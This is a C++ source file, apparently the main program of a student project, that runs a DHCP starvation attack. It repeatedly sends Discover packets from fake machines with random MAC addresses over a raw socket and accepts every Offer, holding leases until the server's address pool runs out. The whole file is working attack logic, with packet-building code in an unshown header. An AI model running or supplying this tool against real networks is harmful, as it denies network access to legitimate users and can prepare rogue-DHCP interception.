#include <iostream>
#include <unistd.h>
#include <cstdlib>
#include <csignal>
#include "pds_dhcp.h"
using namespace std;

vector<Fake_Machine*> machines;

void wrong_input()
{
	cout << "Wrong input arguments!\n";
	exit(1);
}

string parse_args(int argc, char**argv)
{
	string interface_name = "";

	int c;
	while((c = getopt(argc, argv, "i:")) != -1)
	{
		switch(c)
		{
			case 'i':
				interface_name = optarg;
				break;
			default:
				wrong_input();
		}
	}
	if(interface_name == "")
		wrong_input();

	return interface_name;
}

/////////////////////////////////////////
// At Ctrl+C delete all machins and quit
//////////////////////////////////////////
void sigint_handler(int signal)
{
	for(int i = 0; i < machines.size(); i++)
		delete machines[i];
	
	exit(0);
}

////////////////////////////////////////////
// Delete machines with expired IP adresses
////////////////////////////////////////////
void check_dead_machines()
{
	for(int i = 0; i < machines.size(); i++)
	{
		if(machines[i]->is_dead())
		{
			delete machines[i];
			machines.erase(machines.begin() + i);
			i--;
		}
	}
}

int main(int argc, char** argv)
{
	signal(SIGINT, sigint_handler);
	string interface = parse_args(argc, argv);
	
	PDS_Raw_Socket mysocket(interface, false);

	srand(time(NULL));		// For the random MAC adresses...

	Fake_Machine *m;
	PDS_Full_Packet pak;
	while(true)								// Run until Ctrl+C
	{
		m = new Fake_Machine(&mysocket);
		m->emit_discover_packet();

		do
		{
			pak = mysocket.recieve_data();
			if(pak.raw_data.size() == 0)		// If no offer packet arrives within half a second, check for timeouts and try again
			{
				delete m;
				check_dead_machines();	
				break;
			}
			else if(pak.get_DHCP_type() == DHCP_OFFER)	// Send request immediately after offer
			{
				m->accept_offer(pak);
				machines.push_back(m);
				break;
			}
		}
		while(true);		// Wait for DHCP packets
		
	}

	return 0;
}